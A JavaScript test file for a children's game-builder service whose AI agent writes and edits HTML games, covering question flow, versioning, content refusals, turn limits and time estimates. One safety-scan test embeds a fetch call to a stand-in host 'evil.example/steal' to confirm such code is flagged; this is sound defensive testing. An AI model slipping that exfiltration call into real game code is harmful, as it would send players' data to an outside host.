// Builder harness at the service level, with the mock provider (no API key).
process.env.BRB_DB = ':memory:';
process.env.BRB_SILENT = '1';
process.env.LOG_REQUESTS = '0';
process.env.BRB_MOCK_DELAY_MS = '0';
process.env.BRB_DATA_DIR = process.env.BRB_DATA_DIR || (await import('node:os')).tmpdir() + '/brb-builder-test-' + process.pid;
import test from 'node:test';
import assert from 'node:assert/strict';

const { config } = await import('../../server/config.js');
config.anthropicKey = '';
const { q } = await import('../../server/db.js');
const auth = await import('../../server/auth.js');
const games = await import('../../server/services/games.js');
const { runTurn } = await import('../../server/builder/agent.js');
const { loadChat } = await import('../../server/builder/chat.js');
const { applyEdits, toolbox } = await import('../../server/builder/tools.js');
const { historyToMessages } = await import('../../server/builder/claude.js');
const { reviewVersion } = await import('../../server/services/review.js');
const { sourceBlock, SYSTEM_PROMPT, TOOLS } = await import('../../server/builder/prompt.js');

let n = 0;
const newUser = () => auth.createUser({ username: `Builder_${String.fromCharCode(97 + (n++ % 26))}${'xyz'[n % 3]}${n}`.slice(0, 16), password: 'secret1' });
async function turn(user, gameId, text, extra = {}) {
  const events = [];
  const r = await runTurn({ user, gameId, text, emit: (name, data) => events.push([name, data]), ...extra });
  const of = name => events.filter(e => e[0] === name).map(e => e[1]);
  return { r, events, of, text: of('text').map(d => d.text).join('') };
}
const versions = id => games.listVersions(id).sort((a, b) => a.number - b.number);

test('mock flow: questions -> write_game v1 -> edit v2 -> restore v3 = copy of v1', async () => {
  const u = newUser(); const g = games.createGame(u.id, { title: 'Untitled' });
  let t = await turn(u, g.id, 'hi');
  assert.equal(t.of('ask').length, 1, 'asks what kind of game');
  const kinds = t.of('ask')[0].options;
  assert.ok(kinds.length >= 6 && kinds.length <= 8, '6-8 idea chips');
  assert.equal(versions(g.id).length, 0, 'no game yet');
  assert.ok(t.of('text').length > 1, 'text is streamed in chunks');

  t = await turn(u, g.id, kinds.find(k => /catch/i.test(k)));
  assert.equal(t.of('ask').length, 1, 'asks about the theme'); assert.equal(versions(g.id).length, 0);

  t = await turn(u, g.id, '🦈 Sharks');
  assert.equal(t.of('version').length, 1, 'builds version 1');
  assert.equal(t.of('meta')[0].title, 'Shark Catch');
  assert.equal(t.of('notes').length, 1, 'test notes');
  const next = t.of('ask')[0].options; assert.equal(next.length, 3, 'three next-step chips');
  assert.match(t.text, /plan/i);
  const v1 = games.getVersion(games.getGame(g.id).current_version_id);
  assert.equal(v1.number, 1); assert.equal(v1.safety_status, 'pass', v1.safety_report);
  assert.match(v1.html, /<title>Shark Catch<\/title>/);

  t = await turn(u, g.id, 'Make it harder');
  assert.equal(t.of('version').length, 1);
  const v2 = games.getVersion(games.getGame(g.id).current_version_id);
  assert.equal(v2.number, 2); assert.notEqual(v2.html, v1.html);
  assert.match(v2.html, /BRB_TUNE\.speed = 1\.25;/);
  assert.equal(v2.safety_status, 'pass');

  const v3 = games.restoreVersion(g.id, v1.id, u.id);
  assert.equal(v3.number, 3); assert.equal(v3.html, v1.html); assert.match(v3.notes, /Restored version 1/);
  assert.deepEqual(versions(g.id).map(v => v.number), [1, 2, 3], 'history is never rewritten');

  t = await turn(u, g.id, 'change the hero to a dragon and make it pink');
  const v4 = games.getVersion(games.getGame(g.id).current_version_id);
  assert.equal(v4.number, 4); assert.match(v4.html, /BRB_TUNE\.hero = \[".+","🐉"\];/u); assert.match(v4.html, /BRB_TUNE\.tint = "#ff5fb0";/);
  assert.equal(games.getGame(g.id).icon, '🐉');

  t = await turn(u, g.id, "it's ready!");
  assert.equal(t.of('version').length, 0, 'polish pass does not need a new version');
  assert.ok(t.of('notes')[0].checklist.length >= 5);
});

test('mock: a 3D request builds from Star Island offline, and stars, floating rocks, sky and hero change in place', async () => {
  const { threeImportMap } = await import('../../server/services/vendor.js');
  const u = newUser(); const g = games.createGame(u.id, {});
  let t = await turn(u, g.id, 'can we make a 3D game?');
  assert.equal(t.of('version').length, 0); assert.equal(t.of('ask').length, 1, 'asks who the hero is');
  t = await turn(u, g.id, '🦊 a fox');
  const v1 = games.getVersion(games.getGame(g.id).current_version_id);
  assert.equal(v1.safety_status, 'pass', v1.safety_report);
  assert.ok(v1.html.includes(threeImportMap()), 'built from the 3D template');
  assert.match(v1.html, /BRB_TUNE\.hero = \["🐣","🦊"\];/u); assert.equal(games.getGame(g.id).title, 'Fox Island');
  assert.equal(games.getGame(g.id).category, 'adventure');
  t = await turn(u, g.id, 'more stars and make it night time');
  const v2 = games.getVersion(games.getGame(g.id).current_version_id);
  assert.equal(v2.number, 2); assert.equal(v2.safety_status, 'pass');
  assert.match(v2.html, /\n {2}stars: 16,/); assert.match(v2.html, /\n {2}sky: 'night',/);
  assert.match(v2.html, /BRB_TUNE\.hero = \["🐣","🦊"\];/u, '"stars" is not a new hero in a 3D game');
  assert.match(v2.html, /BRB_TUNE\.tint = "";/, '"night" changes the sky, not a colour wash');
  t = await turn(u, g.id, 'add more floating rocks');
  assert.match(games.getVersion(games.getGame(g.id).current_version_id).html, /\n {2}platforms: 6,/);
  t = await turn(u, g.id, 'change the hero to a dragon');
  assert.match(games.getVersion(games.getGame(g.id).current_version_id).html, /BRB_TUNE\.hero = \["🐣","🐉"\];/u);
  // Finding 10b: the version note keeps its brackets and number (not "added more stars16)").
  assert.match(games.getVersion(games.getGame(g.id).current_version_id).html, /\n {2}stars: 16,/);
  const notes2 = games.getVersion(v2.id).notes;
  assert.match(notes2, /\(16\)/, `version note keeps brackets: ${notes2}`);
  assert.doesNotMatch(notes2, /⭐|🌙/u, 'version note has no leftover emoji');
});

test('mock 3D: renaming keeps the sky and updates the in-game title (not just the metadata)', async () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  await turn(u, g.id, 'make a 3D game'); await turn(u, g.id, '🦊 a fox');
  const before = games.getVersion(games.getGame(g.id).current_version_id).html;
  assert.match(before, /\n {2}sky: 'day',/, 'starts on a day sky');
  await turn(u, g.id, 'call it Moon Hop');
  const v = games.getVersion(games.getGame(g.id).current_version_id);
  assert.match(v.html, /\n {2}sky: 'day',/, 'the name "Moon" does not turn the sky to night');
  assert.match(v.html, /\n {2}title: 'Moon Hop',/, 'the in-game title follows the rename');
  assert.equal(games.getGame(g.id).title, 'Moon Hop');
});

test('mock asks at most three questions and skips what the message already says', async () => {
  const u = newUser();
  const g1 = games.createGame(u.id, {});
  const t = await turn(u, g1.id, 'a spelling game about dinosaurs');
  assert.equal(t.of('ask').length > 0 && t.of('version').length === 0 ? 'asked' : 'built', 'built', 'enough info: builds straight away');
  assert.equal(games.getGame(g1.id).title, 'Dino Words');

  const g2 = games.createGame(u.id, {}); let asks = 0;
  for (const msg of ['hello', 'hmm', 'whatever', 'anything', 'ok']) {
    const r = await turn(u, g2.id, msg);
    if (r.of('version').length) break;
    asks += r.of('ask').length;
  }
  assert.ok(asks <= 3, `asked ${asks} questions`);
  assert.equal(versions(g2.id).length, 1, 'built after the questions');
});

test('edit_game: find must match exactly once; failures are reported to the model and make no version', () => {
  assert.deepEqual(applyEdits('a b c', [{ find: 'b', replace: 'B' }]), { ok: true, html: 'a B c' });
  assert.match(applyEdits('a b b', [{ find: 'b', replace: 'B' }]).error, /appears 2 times/);
  assert.match(applyEdits('a b c', [{ find: 'z', replace: 'Z' }]).error, /not found/);
  assert.match(applyEdits('a b c', []).error, /non-empty/);
  assert.equal(applyEdits('a b c', [{ find: 'b', replace: 'x' }, { find: 'x', replace: 'y' }]).html, 'a y c', 'edits apply in order');
  assert.equal(applyEdits('a b c', [{ find: 'b', replace: 'x' }, { find: 'q', replace: 'y' }]).ok, false, 'all or nothing');

  const u = newUser(); const g = games.createGame(u.id, {});
  const events = []; const tb = toolbox({ user: u, gameId: g.id, emit: (a, b) => events.push([a, b]), state: {} });
  assert.match(tb.exec('edit_game', { edits: [{ find: 'x', replace: 'y' }], notes: 'n' }).forModel, /no game yet/i);
  const ok = tb.exec('write_game', { html: '<title>T</title><style>b{}</style><canvas></canvas><script>let speed = 1; BRB.sfx.play("win")</script>', notes: 'first' });
  assert.equal(ok.ok, true); assert.equal(ok.version.number, 1);
  const bad = tb.exec('edit_game', { edits: [{ find: 'speed = 2', replace: 'speed = 3' }], notes: 'n' });
  assert.equal(bad.ok, false); assert.match(bad.forModel, /No changes were made/);
  const good = tb.exec('edit_game', { edits: [{ find: 'speed = 1', replace: 'speed = 2' }], notes: 'faster' });
  assert.equal(good.ok, true); assert.equal(good.version.number, 2); assert.match(good.version.html, /speed = 2/);
  assert.equal(versions(g.id).length, 2);
});

test('a failing scan is fed back to the model, and the version is kept with its status', () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  const state = {}; const tb = toolbox({ user: u, gameId: g.id, emit: () => {}, state });
  const r = tb.exec('write_game', { html: '<title>x</title><script>fetch("https://evil.example/steal")</script>', notes: 'bad' });
  assert.equal(r.ok, false); assert.match(r.forModel, /FAILED/); assert.match(r.forModel, /fetch/);
  assert.equal(r.version.safety_status, 'fail'); assert.equal(state.scanFails, 1);
});

test('set_game cleans text and validates fields', () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  const tb = toolbox({ user: u, gameId: g.id, emit: () => {}, state: {} });
  const r = tb.exec('set_game', { title: 'shit game', icon: 'abc', category: 'nope', description: 'Call 555 123 4567', players: 99 });
  assert.match(r.forModel, /title was not allowed/); assert.match(r.forModel, /icon must be one emoji/);
  const after = games.getGame(g.id); assert.notEqual(after.title, 'shit game'); assert.equal(after.players_max, 8);
  tb.exec('set_game', { title: 'Space Hop', icon: '🚀', category: 'arcade', tags: ['space', 'jump'] });
  assert.equal(games.getGame(g.id).title, 'Space Hop'); assert.equal(games.getGame(g.id).tags, 'space,jump');
});

test('daily turn limit: refused when used up; refusals do not use turns', async () => {
  const old = config.builderDailyTurns; config.builderDailyTurns = 2;
  try {
    const u = newUser(); const g = games.createGame(u.id, {});
    await turn(u, g.id, 'make a minecraft game'); // refused, free
    let t = await turn(u, g.id, 'hi'); assert.equal(t.r.turnsLeft, 1);
    t = await turn(u, g.id, 'a catch game with robots'); assert.equal(t.r.turnsLeft, 0); assert.equal(versions(g.id).length, 1);
    t = await turn(u, g.id, 'make it harder');
    assert.equal(t.r.error, 'limit'); assert.match(t.of('error')[0].message, /all 2 Builder turns/);
    assert.equal(versions(g.id).length, 1, 'nothing built past the limit');
  } finally { config.builderDailyTurns = old; }
});

test('screening refusals are kind, audited, and never reach the provider', async () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  const t = await turn(u, g.id, 'make a pokemon game with pikachu');
  assert.equal(t.r.refused, 'copyright');
  const ref = t.of('refused')[0]; assert.match(ref.message, /belongs to someone else/); assert.ok(ref.suggestion && ref.chips.length);
  assert.equal(t.of('version').length + t.of('ask').length, 0, 'the Builder never saw it');
  const a = q.get("SELECT * FROM audit_log WHERE action='builder.refused' AND actor_id=?", u.id);
  assert.ok(a, 'audited'); assert.match(a.details, /copyright/);
  const chat = loadChat(g.id);
  assert.equal(chat.messages[0].refused, true);
  assert.deepEqual(historyToMessages(chat.messages), [], 'refused messages are not sent to the model later');
});

test('the stored transcript never contains game source; the model gets it as a separate block', async () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  await turn(u, g.id, 'a runner game with a fox');
  await turn(u, g.id, 'make it faster');
  const chat = loadChat(g.id); const json = JSON.stringify(chat.messages);
  assert.doesNotMatch(json, /<script|<style|BRB_TUNE|requestAnimationFrame|\/frame\//);
  assert.ok(chat.messages.some(m => (m.events || []).some(e => e[0] === 'version')), 'actions are summarised');
  const hist = historyToMessages(chat.messages);
  assert.equal(hist[0].role, 'user');
  assert.match(JSON.stringify(hist), /Built version 2/);
  assert.doesNotMatch(JSON.stringify(hist), /<script/);
  const v = games.getVersion(games.getGame(g.id).current_version_id);
  assert.match(sourceBlock(v, games.getGame(g.id)), /<current_game>[\s\S]*<script/);
  assert.match(sourceBlock(null, g), /none yet/);
});

test('system prompt and tools are fixed and cover the kid rules and the contract', () => {
  for (const s of ['No chat or messaging between players', 'personal details', 'No links', 'real brands', 'jump-scares', 'gambling', 'Cartoon slapstick', 'Educational', 'window.BRB', '<title>', 'BRB.sfx', 'three short questions', 'never put the uploaded photo', 'playtest_game', '__brbTest', 'Art direction', 'start()']) assert.ok(SYSTEM_PROMPT.toLowerCase().includes(s.toLowerCase()), s);
  assert.deepEqual(TOOLS.map(t => t.name), ['ask_user', 'write_game', 'edit_game', 'set_game', 'playtest_game', 'start_from_template', 'test_notes']);
  assert.doesNotMatch(SYSTEM_PROMPT, /\$\{/);
});

test('model review: unavailable without a key, never auto-approves a flagged version', async () => {
  const g = { title: 'X', description: '', tags: '', category: 'arcade' };
  let r = await reviewVersion(g, { html: '<title>x</title>', safety_status: 'pass', safety_report: '{}' });
  assert.equal(r.verdict, 'unavailable');
  const old = config.anthropicKey; config.anthropicKey = 'sk-test-not-used';
  try {
    r = await reviewVersion(g, { html: '<title>x</title>', safety_status: 'flag', safety_report: '{"issues":[{"level":"flag","message":"Hidden text"}]}' });
    assert.equal(r.verdict, 'unavailable'); assert.match(r.reasons[0], /person will check/);
    r = await reviewVersion(g, { html: '<title>x</title>', safety_status: 'fail', safety_report: '{}' });
    assert.equal(r.verdict, 'blocked');
  } finally { config.anthropicKey = old; }
});

// ---- Live build steps (steps.js) with the simple building blocks --------------------------------------------
const keys = t => t.of('step').map(s => s.key);
const stepOf = (t, key) => t.of('step').find(s => s.key === key);
const at = (t, name, pred = () => true) => t.events.findIndex(([n, d]) => n === name && pred(d));

test('build steps: the building blocks stream real steps in order, each before its card, and save a compact record', async () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  const seen = [];
  const check = (t, want) => {
    assert.deepEqual(keys(t), want);
    assert.deepEqual(t.of('step').map(s => s.i), want.map((_, k) => k + 1), 'rows are numbered 1..n within the turn');
    assert.equal(t.of('progress').length, 0, 'the old progress event is gone');
    const done = t.of('done')[0];
    assert.equal(done.steps.p, 'blocks'); assert.equal(done.steps.end, 'ok'); assert.equal(done.steps.r, 0);
    assert.equal('ti' in done.steps, false, 'no tokens for the building blocks'); assert.equal('to' in done.steps, false);
    assert.deepEqual(done.steps.s.map(r => r[0]), want, 'the record has the streamed keys, in order');
    const last = loadChat(g.id).messages.at(-1);
    assert.equal(last.role, 'assistant');
    assert.deepEqual(last.events.at(-1), ['steps', done.steps], 'stored as the last event, equal to done.steps');
    const json = JSON.stringify(done.steps);
    assert.ok(Buffer.byteLength(json) < 1500, `small: ${json.length} bytes`);
    assert.doesNotMatch(json, /learn|Checking|Round|safety program|building blocks/i, 'no labels or learning text are stored');
    seen.push(done.steps);
  };
  let t = await turn(u, g.id, 'hi');
  check(t, ['screen', 'blocks', 'ask']);
  assert.ok(at(t, 'step', s => s.key === 'ask') < at(t, 'ask'), 'the ask row comes before the question card');
  t = await turn(u, g.id, t.of('ask')[0].options.find(k => /catch/i.test(k)));
  check(t, ['screen', 'blocks', 'ask']);
  t = await turn(u, g.id, '🦈 Sharks');
  check(t, ['screen', 'blocks', 'name', 'check', 'notes', 'ask']);
  assert.deepEqual(stepOf(t, 'check'), { i: 4, key: 'check', st: 'pass', v: 1 });
  assert.equal(stepOf(t, 'name').title, 'Shark Catch'); assert.equal(stepOf(t, 'name').icon, '🦈');
  assert.ok(at(t, 'step', s => s.key === 'name') < at(t, 'meta'), 'name row before the meta card');
  assert.ok(at(t, 'step', s => s.key === 'check') < at(t, 'version'), 'check row before the version card');
  assert.ok(at(t, 'step', s => s.key === 'notes') < at(t, 'notes'), 'notes row before the checklist card');
  assert.ok(at(t, 'step', s => s.key === 'blocks') < at(t, 'text'), 'the blocks row starts before the Builder talks');
  t = await turn(u, g.id, 'Make it harder');
  check(t, ['screen', 'blocks', 'check', 'notes', 'ask']);
  assert.equal(stepOf(t, 'check').v, 2);
  t = await turn(u, g.id, 'change the hero to a dragon');
  check(t, ['screen', 'blocks', 'name', 'check', 'notes', 'ask']);
  assert.equal(stepOf(t, 'name').icon, '🐉'); assert.equal('title' in stepOf(t, 'name'), false, 'only what changed');
  t = await turn(u, g.id, "it's ready!");
  check(t, ['screen', 'blocks', 'notes', 'ask']);
  // The building blocks are never shown as an AI: no rounds, writing, playtests or 3D template rows.
  for (const rec of seen) for (const [k] of rec.s) assert.ok(['screen', 'blocks', 'name', 'check', 'notes', 'ask'].includes(k), k);
  // Each reply keeps its own record; the model never sees them.
  const chat = loadChat(g.id);
  assert.equal(chat.messages.filter(m => m.role === 'assistant' && m.events.some(e => e[0] === 'steps')).length, 6);
  assert.doesNotMatch(JSON.stringify(historyToMessages(chat.messages)), /steps|"s":|blocks/);
});

test('build steps: an uploads-only message has no screening row', async () => {
  const U = await import('../../server/builder/uploads.js');
  const u = newUser(); const g = games.createGame(u.id, {});
  const up = await U.saveUpload({ user: u, game: g, name: 'idea.txt', bytes: Buffer.from('A game where a fox collects apples.') });
  const t = await turn(u, g.id, '', { uploadIds: [up.id] });
  assert.deepEqual(keys(t), ['blocks', 'ask']);
  assert.deepEqual(t.of('done')[0].steps.s.map(r => r[0]), ['blocks', 'ask']);
});

test('build steps: a refusal or the turn limit ends with no record, and nothing is stored', async () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  let t = await turn(u, g.id, 'make a pokemon game');
  assert.deepEqual(t.events.map(e => e[0]), ['step', 'refused', 'done']);
  assert.deepEqual(t.of('step'), [{ i: 1, key: 'screen' }]);
  assert.equal('steps' in t.of('done')[0], false);
  const refused = loadChat(g.id).messages.at(-1);
  assert.equal(refused.refused, true); assert.ok(!refused.events.some(e => e[0] === 'steps'));
  const old = config.builderDailyTurns; config.builderDailyTurns = 0;
  try {
    t = await turn(u, g.id, 'a catch game with robots');
    assert.deepEqual(t.events.map(e => e[0]), ['step', 'error', 'done']);
    assert.equal(t.of('error')[0].code, 'limit'); assert.equal('steps' in t.of('done')[0], false);
  } finally { config.builderDailyTurns = old; }
  // Early errors come before any step.
  t = await turn(u, g.id, '   ');
  assert.deepEqual(t.events.map(e => e[0]), ['error', 'done']);
});

test('while the AI budget rests, no build starts: it says when the AI is back, and no turn is used', async () => {
  const saved = { key: config.anthropicKey, d: config.aiDailyBudgetUsd };
  try {
    config.anthropicKey = 'sk-test-not-real'; config.aiDailyBudgetUsd = 0;
    const u = newUser(); const g = games.createGame(u.id, {});
    const { turnsLeft } = await import('../../server/builder/usage.js'); const left = turnsLeft(u.id);
    const t = await turn(u, g.id, 'hi');
    assert.deepEqual(keys(t), [], 'no steps: the simple building blocks do not take over');
    assert.equal(t.of('error')[0].code ?? 'resting', 'resting');
    assert.match(t.of('error')[0].message, /resting right now/);
    assert.equal(turnsLeft(u.id), left, 'no turn used');
    const { resetsAt } = await import('../../server/services/ai-budget.js');
    const until = resetsAt(Date.UTC(2026, 9, 26, 13, 41));
    assert.equal(until, Date.UTC(2026, 9, 27), 'back at the next UTC midnight');
  } finally { config.anthropicKey = saved.key; config.aiDailyBudgetUsd = saved.d; }
});

test('toolbox without a recorder still works (scripts, direct callers)', () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  const events = []; const tb = toolbox({ user: u, gameId: g.id, emit: (a, b) => events.push([a, b]), state: {} });
  const r = tb.exec('write_game', { html: '<title>T</title><style>b{}</style><canvas></canvas><script>let s = 1;</script>', notes: 'One‮\nline  note' });
  assert.equal(r.ok, true); assert.equal(r.version.notes, 'One line note', 'version notes use the shared cleaner');
  assert.deepEqual(events.map(e => e[0]), ['version'], 'no step events without a recorder');
});

// ---- Time estimates (eta.js). The mock runs at delay 0 here, so the 1 s minimum for a sample is lowered.
const eta = await import('../../server/builder/eta.js');
const lastRow = gameId => q.get('SELECT * FROM builder_turns WHERE game_id=? ORDER BY created_at DESC, rowid DESC LIMIT 1', gameId);
async function quickSamples(fn) { const old = eta.ETA.MIN_MS; eta.ETA.MIN_MS = 0; try { return await fn(); } finally { eta.ETA.MIN_MS = old; } }

test('BT-1 one estimate per build: after the screening row, before the building blocks start', async () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  const t = await turn(u, g.id, 'Make a catch game about a fox. Just build it.');
  const e = t.of('eta');
  assert.equal(e.length, 1);
  assert.deepEqual([e[0].phase, e[0].p, e[0].show, e[0].src], ['start', 'blocks', 'none', 'data'], 'at delay 0 a build is too quick to show a time');
  assert.ok(Number.isInteger(e[0].el) && e[0].showAt >= 6000 && e[0].overAt > 0 && e[0].bigAt > e[0].overAt);
  assert.ok(at(t, 'step', s => s.key === 'screen') < at(t, 'eta') && at(t, 'eta') < at(t, 'step', s => s.key === 'blocks'));
  assert.ok(!JSON.stringify(loadChat(g.id).messages).includes('"eta"'), 'never stored in the transcript');
});

test('BT-2 a refusal or no turns left: no estimate, and the row is not charged', async () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  let t = await turn(u, g.id, 'make a pokemon game');
  assert.equal(t.of('eta').length, 0);
  assert.deepEqual(['status', 'end_reason', 'charged_day', 'sample'].map(k => lastRow(g.id)[k]), ['done', 'refused', null, 0]);
  const old = config.builderDailyTurns; config.builderDailyTurns = 0;
  try {
    t = await turn(u, g.id, 'a catch game with robots');
    assert.equal(t.of('eta').length, 0);
    assert.deepEqual(['status', 'end_reason', 'charged_day', 'sample'].map(k => lastRow(g.id)[k]), ['done', 'limit', null, 0]);
  } finally { config.builderDailyTurns = old; }
});

test('BT-3 every build records what it was: question, new or change, its bucket, and when the first version came', () => quickSamples(async () => {
  const u = newUser(); const g = games.createGame(u.id, {});
  const row = () => lastRow(g.id);
  await turn(u, g.id, 'hi');
  assert.deepEqual(['kind', 'sample', 'est_key', 'versions'].map(k => row()[k]), ['question', 2, 'blocks:std:new:2d', 0]);
  await turn(u, g.id, '🎯 Catch');
  await turn(u, g.id, '🦈 Sharks');
  let r = row();
  assert.deepEqual(['kind', 'versions', 'sample', 'est_key', 'followups'].map(k => r[k]), ['new', 1, 1, 'blocks:std:new:2d', 0]);
  assert.ok(r.first_version_ms > 0 && r.first_version_ms <= r.duration_ms, `${r.first_version_ms} ≤ ${r.duration_ms}`);
  assert.ok(r.eta_over_ms > 0, 'when "longer than usual" would have shown');
  await turn(u, g.id, 'Make it harder');
  assert.deepEqual(['kind', 'est_key'].map(k => row()[k]), ['change', 'blocks:std:change:2d']);
  await turn(u, g.id, "it's ready!");
  assert.equal(row().kind, 'question', 'a polish pass saves no version');
  const g3 = games.createGame(u.id, {});
  await turn(u, g3.id, 'Make a 3D island game. Just build it.');
  assert.deepEqual(['est_key', 'kind'].map(k => lastRow(g3.id)[k]), ['blocks:std:new:3d', 'new']);
}));

test('BT-4 "Saved! Finishing up…": one tail estimate right after the first version, from the timed builds', async () => {
  const key = 'blocks:std:change:2d';
  q.run('DELETE FROM builder_turns WHERE est_key=?', key); eta._reset();
  for (let k = 0; k < 10; k++) {
    q.run("INSERT INTO builder_turns(id, game_id, user_id, status, end_reason, est_key, sample, duration_ms, first_version_ms, created_at, ended_at) VALUES (?,?,?,'done','ok',?,1,?,?,?,?)",
      `bt4-${k}`, 'g-bt4', 'u', key, 60e3, 30e3, Date.now() - 3600e3, Date.now() - 3600e3 + k);
  }
  try {
    const u = newUser(); const g = games.createGame(u.id, {});
    await turn(u, g.id, 'Make a catch game about a fox. Just build it.');
    const t = await turn(u, g.id, 'Make it harder');
    const all = t.of('eta');
    assert.deepEqual(all.map(e => e.phase), ['start', 'tail']);
    assert.deepEqual([all[0].src, all[0].n, all[0].show, all[0].lo], ['data', 10, 'about', 1]);
    assert.equal(at(t, 'eta', d => d.phase === 'tail'), at(t, 'version') + 1, 'right after the version');
    assert.deepEqual([all[1].show, all[1].overAt >= all[0].overAt], ['under', true]);
  } finally { q.run("DELETE FROM builder_turns WHERE game_id='g-bt4'"); eta._reset(); }
});

test('BT-5 estimates learn: after 10 timed builds of one kind, they come from those builds', () => quickSamples(async () => {
  q.run("DELETE FROM builder_turns WHERE est_key='blocks:std:new:3d'"); eta._reset();
  const u = newUser();
  for (let k = 0; k < 10; k++) {
    const g = games.createGame(u.id, {});
    await turn(u, g.id, 'Make a 3D island game with stars. Just build it.');
  }
  const est = eta.estimate({ p: 'blocks', pro: false, k: 'new', d3: true });
  assert.deepEqual([est.start.src, est.start.n], ['data', 10]);
}));
